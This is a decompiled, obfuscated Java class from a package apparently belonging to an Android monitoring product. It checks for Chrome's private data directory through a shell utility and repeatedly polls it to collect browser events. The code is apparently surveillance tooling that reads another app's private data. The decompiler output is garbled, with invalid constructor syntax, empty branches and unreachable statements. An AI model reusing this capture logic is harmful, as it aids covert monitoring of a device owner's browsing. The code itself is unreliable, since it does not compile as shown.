package com.vvt.capture.chrome.b;

import android.os.SystemClock;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class c
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private long d = -1;
  private String e;
  private String f;
  
  public c(String paramString1, String paramString2)
  {
    this.e = paramString1;
    this.f = paramString2;
  }
  
  private boolean b()
  {
    return ShellUtil.b("/data/data/com.android.chrome/app_chrome/Default");
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    try
    {
      bool1 = b();
      if (bool1)
      {
        localObject = this.e;
        String str = this.f;
        long l2 = com.vvt.capture.chrome.a.a.a((String)localObject, str);
        bool1 = a;
        if (bool1) {}
        bool1 = false;
        localObject = null;
        l3 = l2;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l3 < l1;
          if (bool3) {
            break;
          }
          int k = 10;
          if (j >= k) {
            break;
          }
          l3 = 6000L;
          SystemClock.sleep(l3);
          localObject = this.e;
          str = this.f;
          long l4 = com.vvt.capture.chrome.a.a.a((String)localObject, str);
          int i = j + 1;
          j = i;
          l3 = l4;
        }
      }
      bool2 = c;
      if (!bool2) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject;
        long l3;
        boolean bool4;
        boolean bool2 = c;
        if (bool2)
        {
          continue;
          this.d = l3;
        }
      }
    }
    l3 = l1;
    bool4 = l3 < l1;
    if (!bool4)
    {
      bool2 = b;
      if (bool2) {}
      l3 = this.d;
      localObject = Long.valueOf(l3);
      localFxSimpleEventReference.setReference((Long)localObject);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
    }
  }
  
  public List a(int paramInt)
  {
    long l1 = -1;
    int i = a;
    if (i != 0) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        i = b();
        if (i == 0) {
          continue;
        }
        Object localObject = this.e;
        String str1 = this.f;
        long l2 = com.vvt.capture.chrome.a.a.a(paramInt, (String)localObject, str1);
        localObject = this.e;
        String str2 = this.f;
        long l3 = com.vvt.capture.chrome.a.a.a((String)localObject, str2);
        i = 0;
        localObject = null;
        boolean bool2 = l2 < l1;
        if (bool2)
        {
          bool2 = l3 < l1;
          if (bool2) {}
        }
        else
        {
          int k = 10;
          if (i < k)
          {
            l2 = 6000L;
            SystemClock.sleep(l2);
            str1 = this.e;
            String str3 = this.f;
            l2 = com.vvt.capture.chrome.a.a.a(paramInt, str1, str3);
            str2 = this.e;
            String str4 = this.f;
            l3 = com.vvt.capture.chrome.a.a.a(str2, str4);
            int j;
            i += 1;
            continue;
          }
        }
        bool1 = l2 < l1;
        if (bool1)
        {
          bool1 = l3 < l1;
          if (bool1)
          {
            l1 = 1L;
            l2 -= l1;
            localObject = this.e;
            String str5 = this.f;
            localObject = com.vvt.capture.chrome.a.a.a((String)localObject, l2, l3, str5);
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
      catch (Exception localException)
      {
        boolean bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      bool1 = c;
      if (!bool1) {}
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        Object localObject = paramg1.getReference();
        localObject = (Long)localObject;
        long l1 = ((Long)localObject).longValue();
        localObject = paramg2.getReference();
        localObject = (Long)localObject;
        long l2 = ((Long)localObject).longValue();
        localObject = a.b();
        if (localObject == null) {
          continue;
        }
        int i = ((String)localObject).length();
        if (i <= 0) {
          continue;
        }
        bool2 = a;
        if (bool2) {}
        localObject = this.e;
        String str = this.f;
        localObject = com.vvt.capture.chrome.a.a.a((String)localObject, l1, l2, str);
        localArrayList.addAll((Collection)localObject);
      }
      catch (Exception localException)
      {
        boolean bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      bool2 = a;
      if (bool2) {}
      return localArrayList;
      bool2 = c;
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */